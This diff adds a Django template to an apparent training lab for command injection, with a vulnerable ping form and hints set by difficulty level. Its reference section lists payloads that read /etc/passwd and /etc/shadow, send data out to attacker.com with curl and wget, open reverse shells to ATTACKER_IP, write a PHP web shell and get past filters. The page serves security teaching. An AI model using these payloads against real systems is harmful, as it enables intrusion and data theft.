@@ -1,0 +1,111 @@
+{% extends "base.html" %}
+{% block title %}命令注入 - XinRange{% endblock %}
+
+{% block content %}
+<a href="/" class="back-link">← 返回首页</a>
+
+<div class="card">
+    <div class="card-title">🖥️ 命令注入漏洞</div>
+    <div class="card-desc">
+        漏洞原理：应用程序将用户输入传递给系统命令执行函数（如 <code>shell=True</code>），未对输入做严格校验，攻击者可通过拼接额外命令达到任意命令执行。<br>
+        本模块以 <code>ping</code> 功能为入口，演示命令注入的利用与防御。
+    </div>
+</div>
+
+<!-- 难度选择 -->
+<div class="difficulty-bar">
+    <span>难度：</span>
+    <a href="?level=low"><button class="diff-btn low {% if difficulty == 'low' %}active{% endif %}">🔵 Low</button></a>
+    <a href="?level=medium"><button class="diff-btn medium {% if difficulty == 'medium' %}active{% endif %}">🟡 Medium</button></a>
+    <a href="?level=high"><button class="diff-btn high {% if difficulty == 'high' %}active{% endif %}">🔴 High</button></a>
+</div>
+
+<!-- Ping 工具 -->
+<div class="card">
+    <div class="card-title">🌐 Ping 工具</div>
+    <form method="post" action="/vulns/cmd/ping/?level={{ difficulty }}">
+        {% csrf_token %}
+        <div style="display:flex;gap:10px;">
+            <input type="text" name="target" placeholder="输入 IP 或域名，如 127.0.0.1" required>
+            <input type="hidden" name="executed_by" value="guest">
+            <button type="submit" class="btn btn-primary">执行 Ping</button>
+        </div>
+    </form>
+</div>
+
+<!-- 历史记录 -->
+<div class="card">
+    <div class="card-title">📋 执行历史</div>
+    {% if results %}
+    <table>
+        <thead><tr><th>目标</th><th>执行者</th><th>结果摘要</th><th>时间</th></tr></thead>
+        <tbody>
+        {% for r in results %}
+        <tr>
+            <td><code>{{ r.target }}</code></td>
+            <td>{{ r.executed_by }}</td>
+            <td style="font-size:12px;color:var(--muted);">{{ r.result|truncatechars:60 }}</td>
+            <td style="color:var(--muted);font-size:12px;">{{ r.created_at|date:"Y-m-d H:i" }}</td>
+        </tr>
+        {% endfor %}
+        </tbody>
+    </table>
+    {% else %}
+    <div class="alert alert-warn">暂无执行记录。</div>
+    {% endif %}
+</div>
+
+<!-- 参考 Payload -->
+<div class="card">
+    <div class="card-title">命令注入参考 Payload</div>
+    <div class="card-desc">
+        <pre># 1. 基础命令注入
+127.0.0.1; whoami
+127.0.0.1 && whoami
+127.0.0.1 | whoami
+127.0.0.1 || whoami
+
+# 2. 无回显命令注入（DNS外带）
+127.0.0.1; curl http://attacker.com/$(whoami)
+127.0.0.1; wget http://attacker.com/?q=$(id)
+
+# 3. 反弹 Shell
+# Kali 监听: nc -lvnp 4444
+127.0.0.1; bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1
+127.0.0.1; nc -e /bin/bash ATTACKER_IP 4444
+
+# 4. 文件写入
+127.0.0.1; echo '&lt;?php eval($_POST[cmd]); ?&gt;' &gt; /tmp/shell.php
+
+# 5. 读取敏感文件
+127.0.0.1; cat /etc/passwd
+127.0.0.1; cat /etc/shadow
+
+# 6. 绕过过滤
+# 空格过滤:
+127.0.0.1;cat${IFS}/etc/passwd
+127.0.0.1;{cat,/etc/passwd}
+127.0.0.1;cat&lt;/etc/passwd
+
+# 管道符过滤:
+127.0.0.1;whoami
+127.0.0.1`whoami`
+127.0.0.1$(whoami)</pre>
+    </div>
+</div>
+
+{% if difficulty == 'low' %}
+<div class="alert alert-danger">
+    ⚠️ Low 难度：使用 <code>shell=True</code> 直接执行，任意命令注入均可生效。<br>
+    尝试：<code>127.0.0.1; whoami</code> 或 <code>127.0.0.1 | cat /etc/passwd</code>
+</div>
+{% elif difficulty == 'medium' %}
+<div class="alert alert-warn">
+    ⚠️ Medium 难度：过滤了 <code>; | &</code> 等字符。尝试用 <code>%0a</code>（换行符URL编码）或 <code>`命令`</code>（反引号）绕过。
+</div>
+{% else %}
+<div class="alert alert-success">
+    ✅ High 难度：使用列表参数执行命令，无注入风险。但可尝试在输入框中寻找其他注入点（如日志记录处）。
+</div>
+{% endif %}
+{% endblock %}
